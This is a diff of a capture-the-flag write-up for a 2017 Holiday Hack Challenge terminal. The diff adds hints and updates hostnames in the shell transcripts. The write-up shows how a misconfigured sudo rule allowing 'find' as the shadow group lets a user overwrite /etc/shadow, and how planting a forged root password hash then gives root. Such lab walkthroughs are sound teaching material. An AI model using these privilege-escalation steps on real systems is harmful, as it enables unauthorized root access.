@@ -1,7 +1,7 @@
-* Answer Template
-  :PROPERTIES:
-  :CUSTOM_ID: answer-template
-  :END:
+* Oh Wait! Maybe WE Are...
+   :PROPERTIES:
+   :CUSTOM_ID: title
+   :END:
 
 ** Question
    :PROPERTIES:
@@ -38,9 +38,12 @@
    :CUSTOM_ID: how-to-find-the-terminal
    :END:
 
-Where was the terminal?
+From this game: https://2017.holidayhackchallenge.com/game/f09180b7-43e4-406c-83ac-924539e7b8f5
 
-https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&uid=USER_ID
+Direct link: https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&uid=USER_ID
+
+#+CAPTION: The terminal is just behind the starting ramp on the main platform.
+[[../images/terminal-location-we_are.png]]
 
 ** Background Information
    :PROPERTIES:
@@ -69,9 +72,22 @@ need to ~cp /etc/shadow.bak /etc/shadow~, except that we don't have
 permissions to do that directly:
 
 #+BEGIN_SRC sh
-elf@40a64f5e12a2:~$ cp /etc/shadow.bak /etc/shadow
+elf@784e43534178:~$ cp /etc/shadow.bak /etc/shadow
 cp: cannot create regular file '/etc/shadow': Permission denied
 #+END_SRC
+
+** Hints
+   :PROPERTIES:
+   :CUSTOM_ID: approach
+   :END:
+
+[[https://twitter.com/ClimbALLdaTrees][Shinny Upatree on Twitter has a few hints]]
+  * [[https://twitter.com/ClimbALLdaTrees/status/938578034113765376][You know that feeling when something horrible has happened? So I was editing /etc/shadow manually, and... well:
+$ ls -l /etc/shadow
+-rw-rw---- 1 root shadow 0 Dec  7 01:13 /etc/shadow
+
+@1Horse1OSSleigh tells me the "Non-default shadow group permissions" might help.... okay?]
+  * [[https://twitter.com/ClimbALLdaTrees/status/938578359860174848][I think I have some pseudo (sp?) permissions on this Unix server, but I don't know what that means. @GreenesterElf said this was a "learning opportunity" and won't give me the answer :'(]]
 
 ** Approach
    :PROPERTIES:
@@ -90,18 +106,18 @@ sudo - execute a command as another user
 To follow the hint, we should run sudo with the ~--list~ option, to see what our privileges are:
 
 #+BEGIN_SRC sh
-elf@40a64f5e12a2:~$ sudo --list
-Matching Defaults entries for elf on 40a64f5e12a2:
+elf@784e43534178:~$ sudo --list
+Matching Defaults entries for elf on 784e43534178:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-User elf may run the following commands on 40a64f5e12a2:
+User elf may run the following commands on 784e43534178:
     (elf : shadow) NOPASSWD: /usr/bin/find
 #+END_SRC
 
 We can run the find command, but it also mentions something about shadow. Let's give it a shot:
 
 #+BEGIN_SRC sh
-elf@2100915cb450:~$ sudo find
+elf@784e43534178:~$ sudo find
 [sudo] password for elf: 
 #+END_SRC
 
@@ -111,11 +127,11 @@ right. We can run sudo with ~-l -l~ as the help output said to get
 some more verbose output:
 
 #+BEGIN_SRC sh
-elf@2100915cb450:~$ sudo -l -l
-Matching Defaults entries for elf on 2100915cb450:
+elf@784e43534178:~$ sudo -l -l
+Matching Defaults entries for elf on 784e43534178:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-User elf may run the following commands on 2100915cb450:
+User elf may run the following commands on 784e43534178:
 Sudoers entry:
     RunAsUsers: elf
     RunAsGroups: shadow
@@ -130,7 +146,7 @@ Ok. So sudo lets us run the find command as the user elf, and the group shadow. 
 #+END_EXAMPLE
 
 #+BEGIN_SRC sh
-elf@2100915cb450:~$ sudo -g shadow find 
+elf@784e43534178:~$ sudo -g shadow find 
 .
 ./.bashrc
 ./.bash_logout
@@ -142,7 +158,7 @@ password. So, we know that we can run commands as the elf user, and
 the shadow group. Is this enough to overwrite =/etc/shadow=?
 
 #+BEGIN_SRC sh
-elf@2100915cb450:~$ ls -l /etc/shadow
+elf@784e43534178:~$ ls -l /etc/shadow
 -rw-rw---- 1 root shadow 0 Dec 15 20:00 /etc/shadow
 #+END_SRC
 
@@ -160,13 +176,13 @@ actions: -delete -print0 -printf FORMAT -fprintf FILE FORMAT -print
 
 Let's give it a shot:
 #+BEGIN_SRC sh
-elf@2100915cb450:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow \;
+elf@784e43534178:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow \;
 #+END_SRC
 
 Looks like that worked:
 
 #+BEGIN_SRC sh
-elf@2100915cb450:~$ inspect_da_box 
+elf@784e43534178:~$ inspect_da_box 
                      ___
                     / __'.     .-"""-.
               .-""-| |  '.'.  / .---. \
@@ -205,7 +221,7 @@ AsciiCinema video of the solution?
 =find='s exec syntax is a little weird, and a common mistake is forgetting to escape the semicolon at the end:
 
 #+BEGIN_SRC sh
-elf@2100915cb450:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow ;
+elf@784e43534178:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow ;
 find: missing argument to `-exec'
 #+END_SRC
 
@@ -222,7 +238,7 @@ instead, which will have a password we know for the root user.
 First, let's generate the password hash in the right format:
 
 #+BEGIN_SRC sh
-elf@2100915cb450:~$ echo "password" | openssl passwd -1 -stdin
+elf@784e43534178:~$ echo "password" | openssl passwd -1 -stdin
 $1$wDLzsvsW$0.aZ24yCO8xhhjnfHUIG3/
 #+END_SRC
 
@@ -231,7 +247,7 @@ file to have that for root's password. Remember to be careful in
 escaping special characters in the sed command line.
 
 #+BEGIN_SRC sh
-elf@2100915cb450:~$ sed -e 's/root:\*/root:$1$wDLzsvsW$0.aZ24yCO8xhhjnfHUIG3/' /etc/shadow.bak | tee better.shadow
+elf@784e43534178:~$ sed -e 's/root:\*/root:$1$wDLzsvsW$0.aZ24yCO8xhhjnfHUIG3/' /etc/shadow.bak | tee better.shadow
 root:$1$WPvxfOOK$JqDBD/DPQlpkUBOC3qTp51:17484:0:99999:7:::
 daemon:*:17484:0:99999:7:::
 bin:*:17484:0:99999:7:::
@@ -244,9 +260,9 @@ games:*:17484:0:99999:7:::
 Now, we re-run our find command, and find that we can escalate to root with a password of ~password~:
 
 #+BEGIN_SRC sh
-elf@2100915cb450:~$ sudo -g shadow find -exec cp better.shadow /etc/shadow \;
-elf@2100915cb450:~$ su
+elf@784e43534178:~$ sudo -g shadow find -exec cp better.shadow /etc/shadow \;
+elf@784e43534178:~$ su
 Password: 
-root@2100915cb450:/home/elf# id  
+root@784e43534178:/home/elf# id  
 uid=0(root) gid=0(root) groups=0(root)
 #+END_SRC
